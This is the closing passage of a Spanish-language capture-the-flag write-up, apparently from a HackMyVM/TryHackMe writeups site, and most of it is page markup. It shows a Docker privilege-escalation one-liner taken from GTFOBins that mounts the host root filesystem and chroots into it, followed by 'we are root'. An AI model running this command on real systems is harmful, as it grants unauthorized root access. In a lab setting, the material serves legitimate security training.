+</span></span></code></pre></div><p>Echando un ojo al gtfobins podemos ver que hay un comando para escalar privilegios con docker</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+</span></span></code></pre></div><p>Ya somos root :)</p><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="page-nav d-flex flex-column flex-sm-row"><div class="card w-100"><div class="card-body d-flex"><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M5 12l6 6"/><path d="M5 12l6-6"/></svg></div><div class="d-flex flex-column"><div class=text-body-secondary>Prev</div><a href=/writeups/hackmyvm/jabita/ class="stretched-link text-reset text-decoration-none">Jabita</a></div></div></div><div class=m-2></div><div class="card text-end w-100"><div class="card-body d-flex justify-content-end"><div class="d-flex flex-column"><div class=text-body-secondary>Next</div><a href=/writeups/tryhackme/team/ class="stretched-link text-reset text-decoration-none">Team</a></div><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M13 18l6-6"/><path d="M13 6l6 6"/></svg></div></div></div></div></main></div></div></div><footer class="footer text-muted"><div class=container-lg><div class=row><div class="col-lg-8 text-center text-lg-start"><ul class=list-inline><li class=list-inline-item><a class=text-muted href=/tags/>Tags</a></li></ul></div><div class="col-lg-8 text-center text-lg-end"><ul class=list-inline><li class=list-inline-item>Brought to you by <a class=text-muted href=https://gethyas.com/>Hyas</a></li></ul></div></div></div></footer><script async src=/js/app.1e84dcdaa5ccef6fe83f6d88ac1e444a1f237111cfa2a7a97427f758e9c27ef4.js integrity="sha256-HoTc2qXM72/oP22IrB5ESh8jcRHPoqepdCf3WOnCfvQ="></script><script async src=/js/flexsearch.78e4b7a9456a2770bd6faffb1f6488b30db12ca157c3df4e89e3ae2e258888ae.js integrity="sha256-eOS3qUVqJ3C9b6/7H2SIsw2xLKFXw99OieOuLiWIiK4="></script><script async src=/js/search-modal.c4c023efcdee308e4b5f1110afe1db6b1656f217e67aa7efe54e2f4bf2feccf8.js integrity="sha256-xMAj783uMI5LXxEQr+HbaxZW8hfmeqfv5U4vS/L+zPg="></script><div class="d-inline-flex fixed-bottom-right pb-4 pe-4"><button id=toTop type=button class="btn btn-primary rounded-circle ms-auto p-2"><span class=visually-hidden>Top</span><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-up" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 15l6-6 6 6"/></svg></button></div></body></html>
